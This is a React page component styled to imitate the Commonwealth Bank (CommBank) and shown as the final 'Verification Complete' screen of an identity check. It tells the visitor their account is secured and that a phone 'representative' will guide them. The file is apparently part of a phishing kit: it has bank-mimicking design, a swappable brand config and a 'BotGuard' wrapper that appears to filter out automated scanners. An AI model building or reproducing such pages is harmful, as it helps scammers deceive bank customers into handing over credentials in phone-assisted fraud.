'use client';

/**
 * CBA Completed/Success Page
 * Centered single-column layout matching CommBank design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { CheckCircle } from 'lucide-react';

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="main-container">
        <div className="case-id-box" style={{ maxWidth: '500px' }}>
          <div className="box-header">
            <span>Verification Complete</span>
          </div>

          <div className="status-container">
            {/* Success Icon - Centered */}
            <div className="status-icon-wrapper">
              <CheckCircle strokeWidth={1.5} />
            </div>

            <p className="status-message-primary">
              Thank you for verifying your identity.
            </p>

            <p className="status-message-secondary">
              Your account has been secured. You may safely close this window.
            </p>

            <p className="status-message-secondary" style={{ marginTop: '24px' }}>
              If you were on a call with a representative, they will guide you through the next steps.
            </p>

            <p className="status-page-footer">
              Thank you for banking with {currentBrand.companyName}.
            </p>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
